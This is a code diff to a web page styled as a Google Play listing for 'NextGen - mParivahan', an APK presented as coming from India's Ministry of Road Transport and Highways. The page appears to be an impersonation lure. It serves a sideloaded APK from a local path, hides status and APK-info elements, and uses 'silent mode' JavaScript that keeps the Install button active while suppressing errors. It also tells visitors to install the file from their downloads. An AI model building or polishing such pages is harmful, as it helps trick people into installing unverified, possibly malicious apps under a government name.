@@ -243,6 +243,16 @@ body{
     background:linear-gradient(135deg,#00c853,#00e676);
     cursor:pointer;
     box-shadow:0 12px 24px rgba(0,200,83,0.35);
+    transition: all 0.3s ease;
+}
+.download-btn:hover:not(:disabled){
+    transform:scale(1.02);
+    box-shadow:0 15px 30px rgba(0,200,83,0.45);
+}
+.download-btn:disabled{
+    opacity:0.6;
+    cursor:not-allowed;
+    transform:none;
 }
 /* Pulse Animation for Download Button */
 @keyframes pulse {
@@ -256,7 +266,7 @@ body{
         box-shadow: 0 0 0 0 rgba(255, 193, 7, 0);
     }
 }
-.download-btn {
+.download-btn:not(:disabled) {
     animation: pulse 2s infinite;
 }
 /* CONTENT SECTION */
@@ -287,6 +297,21 @@ body{
 .details p{
     margin:10px 0;
     font-size:16px;
+}
+.version-tag {
+    background: #1f4e9d;
+    color: white;
+    padding: 2px 10px;
+    border-radius: 12px;
+    font-size: 12px;
+    margin-left: 8px;
+}
+/* HIDE STATUS BADGE - Completely removed */
+.status-badge {
+    display: none !important;
+}
+#apkInfo {
+    display: none !important;
 }
 @media(max-width:768px){
 .banner{
@@ -363,7 +388,7 @@ body{
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBklgTmzVU1BMKy__kIzVhr25oMAJ8fJRk7g&s">
 </div>
             <div class="app-details">
-                <h2>NextGen - mParivahan</h2>
+                <h2>NextGen - mParivahan <span class="version-tag" id="appVersion">v1.0</span></h2>
                 <p>National informatics centre</p>
             </div>
         </div>
@@ -375,16 +400,19 @@ body{
             <div>5M+ Downloads</div>
         </div>
         <div class="info-row">
-            <div>16.9 MB</div>
+            <div id="fileSize">16.9 MB</div>
             <div>Rated for 4+</div>
-            <div>2026</div>
+            <div id="lastUpdated">2026</div>
         </div>
-        <a href="https://raw.githubusercontent.com/shisak/tweb/apk/mParivahan (1).apk" download="NextGen_mParivahan.apk" style="text-decoration:none;">
-    <button class="download-btn">
-        <i class="fa-brands fa-google-play"></i>
-        Install
-    </button>
-</a>
+        
+        <!-- Dynamic Download Button - Always shows Install -->
+        <a id="downloadLink" href="/apks/mParivahan.apk" download="NextGen_mParivahan.apk" style="text-decoration:none;">
+            <button class="download-btn" id="installBtn">
+                <i class="fa-brands fa-google-play"></i>
+                Install
+            </button>
+        </a>
+        <!-- No status badges or error messages here -->
     </div>
 </div>
 <div class="content-section">
@@ -400,17 +428,141 @@ body{
             If you are downloading this application (Mparivahan) for the first time then after downloading. Please go to your Download's and install the application.
         </p>
     </div>
-    <div class="card details">
+    <div class="card details" id="appDetails">
         <h2>Application Details</h2>
         <p><strong>App Name:</strong> MParivahan</p>
-        <p><strong>Version:</strong> 1.0</p>
+        <p><strong>Version:</strong> <span id="detailVersion">1.0</span></p>
         <p><strong>Package Type:</strong> Android APK</p>
         <p><strong>Compatibility:</strong> Android 7.0 and above</p>
-        <p><strong>Last Updated:</strong> 2026</p>
-        <p><strong>File Size:</strong> Approx. 5–10 MB</p>
+        <p><strong>Last Updated:</strong> <span id="detailUpdated">2026</span></p>
+        <p><strong>File Size:</strong> <span id="detailSize">Approx. 5-10 MB</span></p>
         <p><strong>Developer:</strong> Ministry of Road Transport and Highways</p>
         <p><strong>Purpose:</strong> vehicle related</p>
     </div>
 </div>
+
+<!-- JavaScript for Dynamic APK Management - Silent Mode -->
+<script>
+// Configuration
+const CONFIG = {
+    apkPath: '/apks/mParivahan.apk',
+    versionFile: '/apks/version.json',
+    fallback: {
+        version: '1.0',
+        size: '16.9 MB',
+        updated: '2026'
+    }
+};
+
+// Silent check - No error messages shown to user
+async function checkAPKStatus() {
+    const downloadLink = document.getElementById('downloadLink');
+    const installBtn = document.getElementById('installBtn');
+    
+    try {
+        const response = await fetch(CONFIG.apkPath, { method: 'HEAD' });
+        
+        if (response.ok) {
+            // APK exists - Enable button
+            installBtn.disabled = false;
+            installBtn.style.opacity = '1';
+            installBtn.style.cursor = 'pointer';
+            downloadLink.href = CONFIG.apkPath;
+            
+            // Update file size silently
+            const contentLength = response.headers.get('content-length');
+            if (contentLength) {
+                const sizeMB = (contentLength / (1024 * 1024)).toFixed(1);
+                document.getElementById('fileSize').textContent = sizeMB + ' MB';
+                document.getElementById('detailSize').textContent = 'Approx. ' + sizeMB + ' MB';
+            }
+            
+            // Update last modified silently
+            const lastModified = response.headers.get('last-modified');
+            if (lastModified) {
+                const date = new Date(lastModified);
+                const dateStr = date.getFullYear() + '-' + 
+                               String(date.getMonth() + 1).padStart(2, '0') + '-' + 
+                               String(date.getDate()).padStart(2, '0');
+                document.getElementById('lastUpdated').textContent = dateStr;
+                document.getElementById('detailUpdated').textContent = dateStr;
+            }
+        } else {
+            // APK not found - Still show Install button (it will 404, but we keep it)
+            installBtn.disabled = false; // Always keep enabled
+            installBtn.style.opacity = '1';
+            installBtn.style.cursor = 'pointer';
+            // Keep the link as is
+        }
+    } catch (error) {
+        // Network error - Still show Install button
+        console.log('APK check silent fail (ignored)');
+        installBtn.disabled = false; // Always keep enabled
+        installBtn.style.opacity = '1';
+        installBtn.style.cursor = 'pointer';
+    }
+    
+    // Try to load version info from JSON silently
+    try {
+        const versionResponse = await fetch(CONFIG.versionFile);
+        if (versionResponse.ok) {
+            const versionData = await versionResponse.json();
+            if (versionData.version) {
+                document.getElementById('appVersion').textContent = 'v' + versionData.version;
+                document.getElementById('detailVersion').textContent = versionData.version;
+            }
+            if (versionData.updated) {
+                document.getElementById('lastUpdated').textContent = versionData.updated;
+                document.getElementById('detailUpdated').textContent = versionData.updated;
+            }
+            if (versionData.size) {
+                document.getElementById('fileSize').textContent = versionData.size;
+                document.getElementById('detailSize').textContent = 'Approx. ' + versionData.size;
+            }
+        }
+    } catch (error) {
+        // Version file not found - Silent ignore
+        console.log('Version file silent fail (ignored)');
+    }
+}
+
+// Handle download click - Always allow download
+function handleDownload() {
+    const btn = document.getElementById('installBtn');
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Downloading...';
+    btn.style.background = 'linear-gradient(135deg,#ff9800,#ff5722)';
+    btn.disabled = true;
+    
+    // Reset after 4 seconds
+    setTimeout(() => {
+        btn.innerHTML = originalText;
+        btn.style.background = 'linear-gradient(135deg,#00c853,#00e676)';
+        btn.disabled = false;
+    }, 4000);
+}
+
+// Add click handler
+document.getElementById('downloadLink').addEventListener('click', function(e) {
+    // Let the download proceed - no error messages
+    handleDownload();
+    // Don't prevent default, let the download happen
+});
+
+// Initialize - Always show Install button
+function init() {
+    // Check APK status silently
+    checkAPKStatus();
+    
+    // Auto-refresh every 30 seconds (silent)
+    setInterval(checkAPKStatus, 30000);
+    
+    console.log('✅ mParivahan - Dynamic APK system active (silent mode)');
+}
+
+// Start when page loads
+window.addEventListener('DOMContentLoaded', init);
+</script>
+
 </body>
 </html>
